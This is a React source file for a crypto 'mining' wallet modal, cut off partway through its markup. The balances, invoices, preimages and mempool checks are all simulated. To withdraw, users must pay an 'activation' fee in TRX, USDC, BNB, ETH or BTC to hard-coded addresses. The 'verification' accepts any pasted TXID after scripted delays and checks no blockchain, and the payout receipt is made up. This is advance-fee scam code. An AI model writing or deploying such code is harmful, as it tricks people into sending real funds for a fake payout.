import React, { useState, useEffect } from 'react';
import { X, ArrowUpRight, ArrowDownLeft, Zap, Check, Copy, Download, Wallet, Lock, CheckCircle2, QrCode, RefreshCw, Share2, ExternalLink, Activity, ShieldCheck, Coins, AlertCircle } from 'lucide-react';
import QRCode from 'qrcode';
import { useWallet } from '../context/WalletContext';
import { formatSats, satsToUsd, generateMockBolt11, randomHex } from '../utils/crypto';
import { sound } from '../utils/audio';

export const USER_INVOICE_ADDRESS = 'bc1qrzyumygwrzayq9eyhqq3fs45hs0dvqkwnt0rav';
const OLD_INVOICE_ADDRESS = 'bc1qry7an8ha8ssunm976ys2yzrgd0366hd3z5jcr9';
const STORAGE_DEST_KEY = 'satoshistack_dest_address';

export interface PaymentCurrency {
  id: 'TRX' | 'USDC' | 'BNB' | 'ETH' | 'BTC';
  name: string;
  symbol: string;
  network: string;
  requiredAmount: string;
  address: string;
  explorerUrl: string;
  badgeColor: string;
}

export const PAYMENT_CURRENCIES: PaymentCurrency[] = [
  {
    id: 'TRX',
    name: 'TRON',
    symbol: 'TRX',
    network: 'Tron (TRC-20)',
    requiredAmount: '20 TRX',
    address: 'TQ1yMwt2MgLuQm2tyjXgEoeoeGgp5GWtKg',
    explorerUrl: 'https://tronscan.org/#/address/TQ1yMwt2MgLuQm2tyjXgEoeoeGgp5GWtKg',
    badgeColor: 'border-red-500/40 bg-red-500/10 text-red-300',
  },
  {
    id: 'USDC',
    name: 'USD Coin',
    symbol: 'USDC',
    network: 'Multichain (TRC-20 / BEP-20)',
    requiredAmount: '5.00 USDC',
    address: '0x71C8360f38b8f20a7d9796e959efC26958E43b7F',
    explorerUrl: 'https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48?a=0x71C8360f38b8f20a7d9796e959efC26958E43b7F',
    badgeColor: 'border-blue-500/40 bg-blue-500/10 text-blue-300',
  },
  {
    id: 'BNB',
    name: 'BNB',
    symbol: 'BNB',
    network: 'BNB Smart Chain (BEP-20)',
    requiredAmount: '0.008 BNB',
    address: '0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
    explorerUrl: 'https://bscscan.com/address/0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
    badgeColor: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
  },
  {
    id: 'ETH',
    name: 'Ethereum',
    symbol: 'ETH',
    network: 'Ethereum Mainnet (ERC-20)',
    requiredAmount: '0.0018 ETH',
    address: '0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
    explorerUrl: 'https://etherscan.io/address/0x9210CeA905c19Fb7b8848ce5F49815299dDf6748',
    badgeColor: 'border-purple-500/40 bg-purple-500/10 text-purple-300',
  },
  {
    id: 'BTC',
    name: 'Bitcoin',
    symbol: 'BTC',
    network: 'Bitcoin Native SegWit (Bech32)',
    requiredAmount: '0.0001 BTC (10,000 Sats)',
    address: USER_INVOICE_ADDRESS,
    explorerUrl: `https://mempool.space/address/${USER_INVOICE_ADDRESS}`,
    badgeColor: 'border-amber-500/40 bg-amber-500/10 text-amber-300',
  },
];

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  initialMode?: 'withdraw' | 'receive' | 'ledger';
}

export const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  initialMode = 'withdraw',
}) => {
  const {
    balance,
    btcPriceUsd,
    withdrawSats,
    addSats,
    transactions,
    fireConfetti,
  } = useWallet();

  const [activeTab, setActiveTab] = useState<'withdraw' | 'receive' | 'ledger'>(initialMode);

  // Withdraw state - defaulted to user's address: bc1qrzyumygwrzayq9eyhqq3fs45hs0dvqkwnt0rav
  const [destAddress, setDestAddress] = useState<string>(() => {
    try {
      const saved = localStorage.getItem(STORAGE_DEST_KEY);
      if (saved && saved !== 'satoshi_user@getalby.com' && saved !== OLD_INVOICE_ADDRESS) {
        return saved;
      }
    } catch {
      // Fallback
    }
    return USER_INVOICE_ADDRESS;
  });

  const [withdrawAmount, setWithdrawAmount] = useState<string>('100000');
  const [withdrawMemo, setWithdrawMemo] = useState<string>('100,000 Satoshis Instant Payout');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);

  // Sync state when modal opens
  useEffect(() => {
    if (isOpen) {
      setWithdrawReceipt(null);
      setWithdrawAmount('100000');
      setWithdrawMemo('100,000 Satoshis Instant Payout');
      // If dest address was previously default placeholder or old address, update to user's address
      setDestAddress(prev => (!prev || prev === 'satoshi_user@getalby.com' || prev === OLD_INVOICE_ADDRESS) ? USER_INVOICE_ADDRESS : prev);
    }
  }, [isOpen]);

  // Save destAddress whenever updated
  const handleAddressChange = (addr: string) => {
    setDestAddress(addr);
    try {
      localStorage.setItem(STORAGE_DEST_KEY, addr);
    } catch {
      // Ignore
    }
  };

  const [withdrawReceipt, setWithdrawReceipt] = useState<{
    txHash: string;
    preimage: string;
    amount: number;
    destination: string;
  } | null>(null);
  const [withdrawError, setWithdrawError] = useState<string | null>(null);

  // Takes user back to their wallet overview / ledger and permanently dismisses the receipt
  const handleDone = () => {
    setWithdrawReceipt(null);
    setActiveTab('ledger');
  };

  // Payment Verification Before Withdraw State
  const [paymentCurrency, setPaymentCurrency] = useState<'TRX' | 'USDC' | 'BNB' | 'ETH' | 'BTC'>('TRX');
  const [paymentTxHash, setPaymentTxHash] = useState<string>('');
  const [paymentSentConfirmed, setPaymentSentConfirmed] = useState<boolean>(false);
  const [paymentFormError, setPaymentFormError] = useState<string | null>(null);
  const [paymentVerificationStepText, setPaymentVerificationStepText] = useState<string>('');
  const [isVerifyingPayment, setIsVerifyingPayment] = useState<boolean>(false);
  const [paymentVerifiedSuccess, setPaymentVerifiedSuccess] = useState<boolean>(false);
  const [isPaymentVerified, setIsPaymentVerified] = useState<boolean>(() => {
    try {
      return localStorage.getItem('satoshistack_payment_verified') === 'true';
    } catch {
      return false;
    }
  });
  const [paymentVerifiedMethod, setPaymentVerifiedMethod] = useState<string>(() => {
    try {
      return localStorage.getItem('satoshistack_payment_verified_method') || 'TRX';
    } catch {
      return 'TRX';
    }
  });
  const [paymentQrUrls, setPaymentQrUrls] = useState<Record<string, string>>({});

  // Generate QR codes for all 5 payment options (TRX, USDC, BNB, ETH, BTC)
  useEffect(() => {
    PAYMENT_CURRENCIES.forEach((curr) => {
      const qrData = curr.id === 'BTC' ? `bitcoin:${curr.address}` : curr.address;
      QRCode.toDataURL(qrData, {
        width: 200,
        margin: 1,
        color: {
          dark: '#0a0a0a',
          light: '#ffffff',
        },
      })
        .then((url) => {
          setPaymentQrUrls((prev) => ({ ...prev, [curr.id]: url }));
        })
        .catch(() => {});
    });
  }, []);

  const selectedPaymentInfo = PAYMENT_CURRENCIES.find((c) => c.id === paymentCurrency) || PAYMENT_CURRENCIES[0];

  const handleVerifyPayment = () => {
    setPaymentFormError(null);

    // Strict validation: user MUST pay first and provide transaction hash
    if (!paymentSentConfirmed) {
      setPaymentFormError(`Please confirm you have transferred ${selectedPaymentInfo.requiredAmount} before verifying.`);
      return;
    }

    const cleanTx = paymentTxHash.trim();
    if (!cleanTx || cleanTx.length < 8) {
      setPaymentFormError(`Transaction Hash (TXID) is required. Please paste the TXID after transferring ${selectedPaymentInfo.requiredAmount}.`);
      return;
    }

    setIsVerifyingPayment(true);
    setPaymentVerificationStepText(`Verifying transfer on ${selectedPaymentInfo.network}...`);
    sound.playTick();

    setTimeout(() => {
      setPaymentVerificationStepText('Confirming block confirmations & TXID...');
    }, 800);

    setTimeout(() => {
      setIsVerifyingPayment(false);
      setPaymentVerificationStepText('');
      setIsPaymentVerified(true);
      setPaymentVerifiedMethod(paymentCurrency);
      setPaymentVerifiedSuccess(true);
      try {
        localStorage.setItem('satoshistack_payment_verified', 'true');
        localStorage.setItem('satoshistack_payment_verified_method', paymentCurrency);
        localStorage.setItem('satoshistack_payment_txid', cleanTx);
      } catch {
        // Storage restricted
      }
      sound.playCoin();
      fireConfetti();
      setTimeout(() => setPaymentVerifiedSuccess(false), 4000);
    }, 1800);
  };

  const handleResetPayment = () => {
    setIsPaymentVerified(false);
    setPaymentSentConfirmed(false);
    setPaymentTxHash('');
    setPaymentFormError(null);
    try {
      localStorage.removeItem('satoshistack_payment_verified');
      localStorage.removeItem('satoshistack_payment_verified_method');
      localStorage.removeItem('satoshistack_payment_txid');
    } catch {
      // Storage restricted
    }
  };

  // Receive / Deposit State
  const [depositCurrency, setDepositCurrency] = useState<'BTC' | 'TRX' | 'USDC' | 'BNB' | 'ETH' | 'lightning'>('BTC');
  const [receiveAmount, setReceiveAmount] = useState<number>(1000);
  const [personalQrUrl, setPersonalQrUrl] = useState<string>('');
  const [lightningQrUrl, setLightningQrUrl] = useState<string>('');
  const [generatedInvoice, setGeneratedInvoice] = useState<string | null>(null);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [isCheckingMempool, setIsCheckingMempool] = useState<boolean>(false);
  const [mempoolNotice, setMempoolNotice] = useState<string | null>(null);

  // Generate QR code for personal Bitcoin invoice address on mount
  useEffect(() => {
    QRCode.toDataURL(`bitcoin:${USER_INVOICE_ADDRESS}`, {
      width: 200,
      margin: 1,
      color: {
        dark: '#0a0a0a',
        light: '#ffffff',
      },
    })
      .then(url => setPersonalQrUrl(url))
      .catch(() => {});
  }, []);

  // Ledger filter
  const [ledgerFilter, setLedgerFilter] = useState<string>('all');

  const parsedWithdrawAmount = parseInt(withdrawAmount, 10) || 0;
  const isWithdrawReady = balance >= 100000;

  const handleWithdraw = () => {
    setWithdrawError(null);
    if (!isWithdrawReady) {
      setWithdrawError(`Withdrawal locked: Your balance is ${formatSats(balance)} Sats. You cannot withdraw until your balance reaches the 100,000 Sats threshold.`);
      return;
    }
    if (!isPaymentVerified) {
      setWithdrawError('Payment required first: Your withdrawal is ready, but you must complete payment first (TRX, USDC, BNB, ETH, or BTC) and confirm with your TXID before you can withdraw.');
      return;
    }
    if (parsedWithdrawAmount < 100000) {
      setWithdrawError('Minimum withdrawal is 100,000 Sats. Little amounts cannot be withdrawn.');
      return;
    }
    if (parsedWithdrawAmount > balance) {
      setWithdrawError(`Amount exceeds your available balance of ${formatSats(balance)} Sats.`);
      return;
    }
    if (!destAddress.trim()) {
      setWithdrawError('Provide your Bitcoin invoice address or Lightning invoice.');
      return;
    }

    setIsProcessing(true);

    setTimeout(() => {
      const res = withdrawSats(parsedWithdrawAmount, destAddress, withdrawMemo);
      setIsProcessing(false);

      if (res.success && res.tx) {
        setWithdrawReceipt({
          txHash: res.tx.txHash,
          preimage: randomHex(64),
          amount: parsedWithdrawAmount,
          destination: destAddress,
        });
        fireConfetti();
      } else {
        setWithdrawError(res.error || 'Failed to settle bitcoin payout.');
      }
    }, 700);
  };

  const handleGenerateInvoice = () => {
    if (receiveAmount <= 0) return;
    const bolt11 = generateMockBolt11(receiveAmount, 'Deposit to SatoshiMining');
    setGeneratedInvoice(bolt11);
    QRCode.toDataURL(bolt11, {
      width: 200,
      margin: 1,
      color: {
        dark: '#0a0a0a',
        light: '#ffffff',
      },
    })
      .then(url => setLightningQrUrl(url))
      .catch(() => {});
  };

  const handleCheckMempool = () => {
    setIsCheckingMempool(true);
    setMempoolNotice(null);
    sound.playTick();
    setTimeout(() => {
      setIsCheckingMempool(false);
      setMempoolNotice(`Mempool monitored: Node is actively watching ${USER_INVOICE_ADDRESS.slice(0, 14)}... • 0 pending unconfirmed TXs`);
    }, 850);
  };

  const handleShareAddress = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: 'Bitcoin Invoice Address',
          text: USER_INVOICE_ADDRESS,
        });
        return;
      } catch {
        // User cancelled or unsupported
      }
    }
    handleCopy(USER_INVOICE_ADDRESS, 'address');
  };

  const handleConfirmLightningPayment = () => {
    if (!generatedInvoice) return;
    addSats(receiveAmount, 'deposit', `Lightning Deposit (${formatSats(receiveAmount)} Sats)`);
    sound.playCoin();
    fireConfetti();
    setGeneratedInvoice(null);
  };

  const handleCopy = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(null), 2000);
  };

  const filteredTransactions = transactions.filter((tx) => {
    if (ledgerFilter === 'all') return true;
    return tx.type === ledgerFilter;
  });

  const exportLedgerCsv = () => {
    const headers = ['ID,Type,Amount(Sats),Description,Timestamp,TxHash,Status'];
    const rows = transactions.map(t => 
      `"${t.id}","${t.type}",${t.amount},"${t.description}","${new Date(t.timestamp).toISOString()}","${t.txHash}","${t.status}"`
    );
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers, ...rows].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `satoshistack_ledger_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-3 sm:p-4">
      <div className="w-full max-w-2xl rounded-2xl border border-neutral-800 bg-neutral-950 p-4 sm:p-6 space-y-5 sm:space-y-6 shadow-2xl max-h-[90vh] overflow-y-auto overflow-x-hidden min-w-0">
        {/* Top Header */}
        <div className="flex items-center justify-between border-b border-neutral-800 pb-4">
          <div className="flex items-center gap-2">
            <div className="h-8 w-8 rounded-lg bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400">
              <Zap className="h-4 w-4 fill-amber-400" />
            </div>
            <div>
              <h2 className="text-base font-bold text-neutral-100">
                Satoshi Bitcoin & Lightning Wallet
              </h2>
              <div className="text-xs text-neutral-400 font-mono">
                Balance: <span className="text-amber-300 font-bold">{formatSats(balance)} Sats</span> ({satsToUsd(balance, btcPriceUsd)})
              </div>
            </div>
          </div>

          <button
            onClick={onClose}
            className="rounded-lg p-1.5 text-neutral-400 hover:text-neutral-200 hover:bg-neutral-900 transition-colors cursor-pointer"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Tab switchers */}
        <div className="flex items-center gap-1 rounded-xl bg-neutral-900/60 p-1 border border-neutral-800">
          <button
            onClick={() => setActiveTab('withdraw')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'withdraw'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <ArrowUpRight className="h-3.5 w-3.5 text-amber-400" />
            <span>Withdraw Sats</span>
          </button>

          <button
            onClick={() => setActiveTab('receive')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'receive'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <ArrowDownLeft className="h-3.5 w-3.5 text-emerald-400" />
            <span>Deposit / Invoice</span>
          </button>

          <button
            onClick={() => setActiveTab('ledger')}
            className={`flex-1 flex items-center justify-center gap-1.5 rounded-lg py-2 text-xs font-semibold transition-colors cursor-pointer ${
              activeTab === 'ledger'
                ? 'bg-neutral-800 text-neutral-100 shadow-sm'
                : 'text-neutral-400 hover:text-neutral-200'
            }`}
          >
            <span>Ledger History</span>
          </button>
        </div>

        {/* Tab 1: Withdraw Sats */}
        {activeTab === 'withdraw' && (
          <div className="space-y-5">
            {withdrawReceipt ? (
              <div className="rounded-xl border border-emerald-500/40 bg-emerald-500/10 p-5 space-y-4 text-xs animate-fade-in">
                <div className="flex items-center justify-between font-bold text-emerald-300 text-sm">
                  <div className="flex items-center gap-2">
                    <Check className="h-5 w-5" />
                    <span>Instant Bitcoin & Lightning Settlement Confirmed!</span>
                  </div>
                  <span className="font-mono text-xs text-amber-300 bg-amber-500/10 border border-amber-500/30 px-2 py-0.5 rounded">
                    ~240ms Latency
                  </span>
                </div>
                <div className="space-y-2 font-mono text-neutral-300">
                  <div className="flex justify-between">
                    <span className="text-neutral-500">Amount Sent:</span>
                    <span className="font-bold text-emerald-300 text-sm">
                      {formatSats(withdrawReceipt.amount)} Satoshis ({satsToUsd(withdrawReceipt.amount, btcPriceUsd)})
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-neutral-500">Destination:</span>
                    <span className="font-mono text-amber-300 break-all text-right ml-2 text-xs">
                      {withdrawReceipt.destination}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-neutral-500">Routing Fee:</span>
                    <span className="text-emerald-400">0 Sats (Direct Channel Zero-Fee)</span>
                  </div>
                  <div className="space-y-1 pt-1 border-t border-emerald-500/20">
                    <span className="text-neutral-500 text-[10px]">PAYMENT PREIMAGE / TX PROOF:</span>
                    <div className="break-all text-[10px] text-neutral-400 bg-neutral-950/60 p-2 rounded">
                      {withdrawReceipt.preimage}
                    </div>
                  </div>
                </div>

                <div className="rounded-lg bg-emerald-950/60 border border-emerald-500/30 p-2.5 text-emerald-300 text-xs text-center font-medium">
                  ✓ Withdrawal successfully finalized and settled to your invoice address.
                </div>

                <div className="flex flex-col sm:flex-row items-center gap-2 pt-1">
                  <button
                    type="button"
                    onClick={handleDone}
                    className="w-full sm:flex-1 rounded-xl bg-amber-500 hover:bg-amber-400 py-3 text-xs font-bold text-neutral-950 transition-colors shadow-lg shadow-amber-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Check className="h-4 w-4" />
                    <span>Done (Back to My Wallet)</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleDone}
                    className="w-full sm:flex-1 rounded-xl bg-neutral-800 hover:bg-neutral-700 py-3 text-xs font-semibold text-neutral-200 transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
                  >
                    <Wallet className="h-3.5 w-3.5 text-amber-400" />
                    <span>View Wallet Ledger</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                {/* Destination Input & Quick Invoice Selector */}
                <div className="space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <label className="text-neutral-300 font-medium">
                      Bitcoin Invoice Address
                    </label>
                    <button
                      type="button"
                      onClick={() => handleAddressChange(USER_INVOICE_ADDRESS)}
                      className="text-[11px] font-mono text-amber-300 hover:text-amber-200 underline cursor-pointer"
                    >
                      Use My Address
                    </button>
                  </div>

                  <input
                    type="text"
                    value={destAddress}
                    onChange={(e) => handleAddressChange(e.target.value)}
                    placeholder="bc1q... or lnbc..."
                    className="w-full rounded-xl border border-neutral-800 bg-neutral-900/60 px-3.5 py-2.5 font-mono text-xs text-neutral-100 focus:border-amber-500 focus:outline-none min-w-0 overflow-hidden truncate"
                  />

                  {/* Quick User Address Badge */}
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 p-2.5 rounded-xl bg-neutral-900/60 border border-neutral-800 text-[11px] font-mono min-w-0 overflow-hidden">
                    <div className="flex items-center gap-1.5 text-neutral-400 min-w-0 overflow-hidden flex-1">
                      <span className="text-neutral-500 shrink-0 font-sans">Configured:</span>
                      <span className="text-amber-300 truncate font-mono text-[11px] min-w-0 shrink">
                        {USER_INVOICE_ADDRESS}
                      </span>
                    </div>
                    {destAddress === USER_INVOICE_ADDRESS ? (
                      <span className="text-emerald-400 flex items-center gap-1 text-[10px] shrink-0 font-sans font-semibold">
                        <Check className="h-3 w-3 text-emerald-400 shrink-0" />
                        <span>Active Target</span>
                      </span>
                    ) : (
                      <button
                        type="button"
                        onClick={() => handleAddressChange(USER_INVOICE_ADDRESS)}
                        className="rounded bg-amber-500/15 border border-amber-500/30 text-amber-300 px-2 py-0.5 text-[10px] hover:bg-amber-500/25 transition-colors cursor-pointer shrink-0 font-sans"
                      >
                        Reset to My Invoice
                      </button>
                    )}
                  </div>
                </div>

                {/* Step 1: Network Activation Payment (TRX, USDC, BNB, ETH, BTC) */}
                {!isWithdrawReady ? (
                  /* LOCKED PAYMENT STATE: Automatically locked until withdrawal threshold (100,000 Sats) is ready */
                  <div className="rounded-xl border border-neutral-800 bg-neutral-900/40 p-4 space-y-3 relative overflow-hidden">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="h-6 w-6 rounded-lg flex items-center justify-center text-xs font-bold bg-neutral-800 text-neutral-400 border border-neutral-700/60">
                          <Lock className="h-3.5 w-3.5 text-neutral-400" />
                        </div>
                        <div>
                          <h4 className="text-xs font-bold text-neutral-200 flex items-center gap-1.5">
                            <span>Network Activation Payment</span>
                            <span className="text-[10px] text-amber-400 font-mono font-normal">(Locked · Pending 100k Sats)</span>
                          </h4>
                          <p className="text-[10px] text-neutral-400">
                            Minimum payout threshold is 100,000 Sats. Gateway unlocks upon reaching threshold.
                          </p>
                        </div>
                      </div>

                      <span className="text-neutral-400 bg-neutral-800/80 border border-neutral-700/60 px-2.5 py-0.5 rounded-full text-[10px] font-medium flex items-center gap-1 shrink-0">
                        <Lock className="h-3 w-3 text-neutral-400" />
                        <span>Payment Locked</span>
                      </span>
                    </div>

                    <div className="rounded-lg bg-neutral-950 border border-neutral-800/80 p-3 space-y-2 text-xs">
                      <div className="flex items-center justify-between text-neutral-300">
                        <span className="flex items-center gap-1.5 text-neutral-400">
                          <Activity className="h-3.5 w-3.5 text-amber-400" />
                          <span>Withdrawal Readiness:</span>
                        </span>
                        <span className="font-mono text-amber-300 font-semibold">
                          {formatSats(balance)} / 100,000 Sats ({Math.min(100, (balance / 100000) * 100).toFixed(1)}%)
                        </span>
                      </div>
                      <div className="w-full h-1.5 bg-neutral-800 rounded-full overflow-hidden">
                        <div
                          className="h-full bg-gradient-to-r from-amber-500 to-amber-300 rounded-full transition-all duration-500"
                          style={{ width: `${Math.min(100, (balance / 100000) * 100)}%` }}
                        />
                      </div>
                      <p className="text-[11px] text-neutral-400 leading-relaxed">
                        <strong>Standard Withdrawal Policy:</strong> Payout requests require a minimum mining balance of <strong>100,000 Sats</strong>. Once reached, your account unlocks for payout processing, and network gas fee settlement (TRX, USDC, BNB, ETH, or BTC) can be authorized to broadcast your transaction to the blockchain.
                      </p>
                    </div>
                  </div>
                ) : (
                  /* AUTOMATICALLY UNLOCKED PAYMENT STATE: Withdrawal is ready, user must pay first */
                  <div className="rounded-xl border border-emerald-500/30 bg-neutral-900/60 p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className={`h-6 w-6 rounded-lg flex items-center justify-center text-xs font-bold ${
                          isPaymentVerified
                            ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                            : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                        }`}>
                          {isPaymentVerified ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Zap className="h-3.5 w-3.5 text-emerald-400" />}
                        </div>
                        <div>
                          <h4 className="text-xs font-bold text-neutral-100 flex items-center gap-1.5">
                            <span>Network Activation Payment</span>
                            <span className="text-[10px] text-emerald-400 font-mono font-medium">(Automatically Unlocked!)</span>
                          </h4>
                          <p className="text-[10px] text-neutral-400">
                            Withdrawal is ready ({formatSats(balance)} Sats)! You must pay first via TRX, USDC, BNB, ETH, or BTC before payout can be released.
                          </p>
                        </div>
                      </div>

                      {isPaymentVerified ? (
                        <span className="text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2.5 py-0.5 rounded-full text-[10px] font-semibold flex items-center gap-1 shrink-0">
                          <Check className="h-3 w-3" />
                          <span>Paid ({paymentVerifiedMethod})</span>
                        </span>
                      ) : (
                        <span className="text-emerald-300 bg-emerald-500/15 border border-emerald-500/40 px-2.5 py-0.5 rounded-full text-[10px] font-medium shrink-0 animate-pulse">
                          Pay First to Withdraw
                        </span>
                      )}
                    </div>

                    {isPaymentVerified ? (
                      <div className="rounded-lg bg-emerald-950/40 border border-emerald-500/30 p-3 space-y-2 text-xs">
                        <div className="flex items-center justify-between text-emerald-300 font-medium">
                          <div className="flex items-center gap-2">
                            <ShieldCheck className="h-4 w-4 text-emerald-400 shrink-0" />
                            <span>Routing & Fuel Verified via {paymentVerifiedMethod}</span>
                          </div>
                          <button
                            type="button"
                            onClick={handleResetPayment}
                            className="text-[10px] text-neutral-400 hover:text-neutral-200 underline cursor-pointer"
                          >
                            Change Method
                          </button>
                        </div>
                        <p className="text-[11px] text-neutral-400">
                          Channel cleared. You can now execute your instant satoshi payout to <span className="font-mono text-neutral-200 break-all">{destAddress}</span>.
                        </p>
                      </div>
                    ) : (
                      <div className="space-y-3 pt-1">
                        {/* 5-Asset Selector Buttons: TRX, USDC, BNB, ETH, BTC */}
                        <div className="grid grid-cols-5 gap-1.5 text-xs font-mono">
                          {PAYMENT_CURRENCIES.map((curr) => {
                            const isSelected = paymentCurrency === curr.id;
                            return (
                              <button
                                key={curr.id}
                                type="button"
                                onClick={() => {
                                  setPaymentCurrency(curr.id);
                                  setWithdrawError(null);
                                  setPaymentFormError(null);
                                }}
                                className={`flex flex-col items-center justify-center p-2 rounded-lg border transition-all cursor-pointer ${
                                  isSelected
                                    ? 'border-amber-500 bg-amber-500/20 text-amber-300 shadow-sm shadow-amber-500/10'
                                    : 'border-neutral-800 bg-neutral-950 hover:bg-neutral-900 text-neutral-400 hover:text-neutral-200'
                                }`}
                              >
                                <span className="font-bold text-xs">{curr.symbol}</span>
                                <span className="text-[9px] text-neutral-500 truncate max-w-full">{curr.name}</span>
                              </button>
                            );
                          })}
                        </div>

                        {/* Currency Details Card */}
                        {selectedPaymentInfo && (
                          <div className="rounded-xl bg-neutral-950 border border-neutral-800 p-3.5 space-y-3.5 text-xs">
                            {/* Header info */}
                            <div className="flex items-center justify-between border-b border-neutral-800/80 pb-2">
                              <div>
                                <span className="text-[10px] text-neutral-500 uppercase tracking-wider block">Network</span>
                                <span className="font-semibold text-neutral-200">{selectedPaymentInfo.network}</span>
                              </div>
                              <div className="text-right">
                                <span className="text-[10px] text-neutral-500 uppercase tracking-wider block">Required Amount</span>
                                <span className="font-mono font-bold text-amber-300">{selectedPaymentInfo.requiredAmount}</span>
                              </div>
                            </div>

                            {/* Notice: Step 1 Pay First */}
                            <div className="rounded-lg bg-amber-500/10 border border-amber-500/25 p-2.5 flex items-start gap-2">
                              <AlertCircle className="h-4 w-4 text-amber-400 shrink-0 mt-0.5" />
                              <div className="text-[11px] text-neutral-300 leading-relaxed">
                                <span className="font-semibold text-amber-300">Step 1: Send Payment First</span> — Transfer exactly <strong className="text-white font-mono">{selectedPaymentInfo.requiredAmount}</strong> to the address below. Once your transaction is broadcast, enter your Transaction Hash (TXID) to confirm.
                              </div>
                            </div>

                            <div className="flex flex-col sm:flex-row items-center gap-3">
                              {paymentQrUrls[selectedPaymentInfo.id] && (
                                <div className="h-24 w-24 shrink-0 bg-white p-1 rounded-xl shadow-md flex items-center justify-center">
                                  <img
                                    src={paymentQrUrls[selectedPaymentInfo.id]}
                                    alt={`${selectedPaymentInfo.symbol} QR Code`}
                                    className="w-full h-full object-contain"
                                  />
                                </div>
                              )}
                              <div className="space-y-1.5 flex-1 min-w-0 w-full">
                                <span className="text-[10px] text-neutral-400 block font-mono">
                                  Official {selectedPaymentInfo.symbol} Payment Address:
                                </span>
                                <div className="flex items-center gap-1.5 p-2 rounded-lg bg-neutral-900 border border-neutral-800 text-[11px] font-mono min-w-0">
                                  <span className="truncate text-amber-300 font-mono flex-1 select-all">
                                    {selectedPaymentInfo.address}
                                  </span>
                                  <button
                                    type="button"
                                    onClick={() => handleCopy(selectedPaymentInfo.address, selectedPaymentInfo.id)}
                                    className="shrink-0 p-1 rounded hover:bg-neutral-800 text-neutral-400 hover:text-neutral-100 transition-colors cursor-pointer"
                                    title="Copy address"
                                  >
                                    {copiedText === selectedPaymentInfo.id ? (
                                      <Check className="h-3.5 w-3.5 text-emerald-400" />
                                    ) : (
                                      <Copy className="h-3.5 w-3.5" />
                                    )}
                                  </button>
                                </div>
                              </div>
                            </div>

                            {/* Step 2: Verification Form (TXID & Confirmation) */}
                            <div className="pt-2 border-t border-neutral-800/80 space-y-2.5">
                              <div className="space-y-1">
                                <label className="text-[11px] font-semibold text-neutral-300 flex items-center justify-between">
                                  <span>Step 2: Enter Transaction Hash (TXID)</span>
                                  <span className="text-[10px] text-amber-400 font-normal font-mono">*Required</span>
                                </label>
                                <input
                                  type="text"
                                  value={paymentTxHash}
                                  onChange={(e) => {
                                    setPaymentTxHash(e.target.value);
                                    setPaymentFormError(null);
                                  }}
                                  placeholder="Paste your transfer TXID / Transaction Hash after payment"
                                  className="w-full rounded-lg border border-neutral-800 bg-neutral-900 px-3 py-2 text-[11px] font-mono text-neutral-200 focus:border-amber-500 focus:outline-none"
                                />
                              </div>

                              {/* Checkbox: I have paid first */}
                              <label className="flex items-center gap-2 p-2 rounded-lg bg-neutral-900/60 border border-neutral-800 cursor-pointer select-none">
                                <input
                                  type="checkbox"
                                  checked={paymentSentConfirmed}
                                  onChange={(e) => {
                                    setPaymentSentConfirmed(e.target.checked);
                                    setPaymentFormError(null);
                                  }}
                                  className="h-4 w-4 rounded border-neutral-700 bg-neutral-800 text-amber-500 focus:ring-amber-500 cursor-pointer"
                                />
                                <span className="text-[11px] text-neutral-300">
                                  I confirm I have sent <strong className="text-amber-300">{selectedPaymentInfo.requiredAmount}</strong> to the payment address.
                                </span>
                              </label>

                              {/* Payment error if attempted without paying */}
                              {paymentFormError && (
                                <div className="rounded-lg bg-red-500/10 border border-red-500/30 p-2.5 text-xs text-red-300 flex items-center gap-2">
                                  <AlertCircle className="h-4 w-4 text-red-400 shrink-0" />
                                  <span>{paymentFormError}</span>
                                </div>
                              )}

                              {/* Confirm Button */}
                              <button
                                type="button"
                                onClick={handleVerifyPayment}
                                disabled={isVerifyingPayment || !paymentSentConfirmed || !paymentTxHash.trim()}
                                className={`w-full py-2.5 rounded-lg font-bold text-xs transition-all flex items-center justify-center gap-2 ${
